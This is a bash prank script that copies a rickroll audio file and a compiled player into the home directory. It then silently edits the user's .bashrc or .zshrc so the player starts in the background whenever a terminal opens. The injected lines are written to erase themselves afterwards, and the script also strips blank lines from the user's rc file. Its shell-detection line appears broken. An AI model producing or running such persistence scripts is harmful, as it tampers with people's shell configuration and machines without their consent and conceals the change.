#!/bin/bash
RC=".zshrc" && ($(echo $BASH) = "/bin/bash") && RC=".bashrc"
cp RICK.mp3 $HOME/Rick.mp3
gcc play.c -o loop
cp loop $HOME/ROLL
###
# this script is run if no target was specified in Makefile
# the purpose is to copy the rick roll into the HOME directory and make it execute
# whenever the next terminal is opened
# this will also trigger the deletion of its launch code, along with its files in HOME
# also every line added to the rc files ia protected against adding it twice
#
# the rickroll however is launced in the background, so that the only way to STOP IT:
# is to type and execute "fg" in said terminal and then interrupt it with ^C
###
sed '/^$/d' $HOME/$RC > temp
cat temp > $HOME/$RC
rm temp
sed -i '' -e 'sP$HOME/ROLL &PPg' $HOME/$RC
echo -n '$HOME/ROLL &' >> $HOME/$RC
sed -i '' -e 'sPT=$(cat $0 | wc | awk '"'"'{print($1)}'"'"')PPg' $HOME/$RC
echo -n 'T=$(cat $0 | wc | awk '"'"'{print($1)}'"'"')' >> $HOME/$RC
sed -i '' -e 'sPN=$(expr $T - 6)","$(expr $T + 0)PPg' $HOME/$RC
echo -n 'N=$(expr $T - 6)","$(expr $T + 0)' >> $HOME/$RC
sed -i '' -e 'sPsed $N'"'"'d'"'"' $0 > tempPPg' $HOME/$RC
echo -n 'sed $N'"'"'d'"'"' $0 > temp' >> $HOME/$RC
sed -i '' -e 'sPcat temp > $0PPg' $HOME/$RC
echo -n 'cat temp > $0' >> $HOME/$RC
sed -i '' -e 'sPrm -rf tempPPg' $HOME/$RC
echo 'rm -rf temp' >> $HOME/$RC
